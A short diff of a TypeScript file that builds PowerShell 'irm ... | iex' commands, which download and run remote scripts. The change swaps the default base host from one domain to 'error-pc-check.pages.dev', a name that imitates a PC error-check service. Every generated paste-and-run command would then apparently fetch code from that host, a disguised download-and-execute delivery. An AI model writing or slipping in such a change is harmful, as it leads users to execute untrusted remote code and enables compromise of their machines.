@@ -17,7 +17,7 @@ interface ReportRow {
  *  sees the staff panel. Override with VITE_RUN_BASE. */
 const RUN_BASE =
   (import.meta.env.VITE_RUN_BASE as string | undefined) ??
-  "https://panel.arctix.uk";
+  "https://error-pc-check.pages.dev";
 
 function runCommand(key: string) {
   return `irm "${RUN_BASE}/run?c=${encodeURIComponent(key)}" | iex`;
